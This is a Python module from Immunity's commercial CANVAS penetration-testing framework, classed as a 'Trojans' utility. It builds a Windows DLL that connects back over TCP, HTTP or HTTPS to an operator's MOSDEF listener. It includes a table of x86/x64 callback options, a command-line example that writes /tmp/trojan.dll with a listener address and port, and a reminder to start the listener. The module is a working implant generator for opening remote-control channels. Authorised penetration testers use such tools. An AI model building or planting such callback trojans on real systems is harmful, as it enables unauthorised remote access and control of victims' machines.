#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement
import sys
if "." not in sys.path:
    sys.path.append(".")

import traceback
from canvasengine import standard_callback_commandline
from libs.canvasos import *

from ExploitTypes.utility import Utility

NAME                   = "BuildMOSDEFDLL"
DESCRIPTION            = "Creates a DLL that will call back to CANVAS"
NOTES                  = """
Creates a DLL file that will connect back to CANVAS.

Here are the valid combinations of options:

| Universal | X64 | HTTP | SSL | Description                |
|-----------+-----+------+-----+----------------------------|
| X         | X   |      |     | Universal/x64 TCP callback |
| X         |     |      |     | Universal/x86 TCP callback |
|           | X   |      |     | x64 TCP callback           |
|           |     |      |     | x86 TCP callback           |
|           | X   | X    | X   | X64 HTTPS callback         |
|           | X   | X    |     | X64 HTTP callback          |
|           |     | X    | X   | x86 HTTPS callback         |
|           |     | X    |     | x86 HTTP callback          |


Commandline Example:
exploits/BuildMOSDEFDLL/BuildMOSDEFDLL.py -O local_ip:192.168.1.1 -O port:4444 -O filename:/tmp/trojan.dll
"""

DOCUMENTATION          =  {}
DOCUMENTATION["Notes"] = NOTES
VERSION                = "1.0"
PROPERTY               = {}
PROPERTY['TYPE']       = "Trojans"


class theexploit(Utility):
    def __init__(self):
        Utility.__init__(self)
        self.result         = ""
        self.name           = NAME
        self.filename       = ""
        self.host           = ""
        self.universal      = False
        self.bits64         = False
        self.http           = False
        self.http_ssl       = False
        self.port           = 5555

    def getargs(self):
        self.host = self.argsDict.get('local_ip', self.host)
        self.getarg("port")
        self.getarg("filename")
        self.getarg("universal")
        self.getarg("bits64")
        self.getarg("http")
        self.getarg("http_ssl")

    def run(self):
        self.getargs()
        self.setInfo("%s (in progress)" % NAME)

        if not self.host:
            self.log('Error: MOSDEF DLL needs a listener ip to connect back to.')
            return 0

        if not self.port:
            self.log('Error: MOSDEF DLL needs a listener port to connect back to.')
            return 0

        self.log('Using listener ip: %s and port: %d' % (self.host, self.port))

        if not self.http: self.log('Universal: %s' % self.universal)
        self.log('64 bits: %s' % self.bits64)

        if self.http:
            self.log('HTTP: True')
            self.log('SSL: %s' % self.http_ssl)
        

        tos = canvasos('Windows')
        if self.bits64: tos.arch = 'x64'
        
        self.buildmosdeftrojan(self.host, self.port, target_os=tos, universal=self.universal,
                               encrypted=False, dll=True, http=self.http, ssl=self.http_ssl,
                               win8_compatible=True)
        try:
            with open(self.filename, 'wb') as f:
                f.write(self.mosdeftrojan)
        except Exception, ex:
            self.log(traceback.format_exc(5))
            return 0

        self.setProgress(100)
        self.setInfo("%s (DONE - %s)" % (NAME, self.filename))
        self.log('Wrote MOSDEF DLL file to %s' % self.filename)
        self.log('Do not forget to start your MOSDEF listener at %s:%d' % (self.host, self.port))
        return 1

if __name__=="__main__":
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
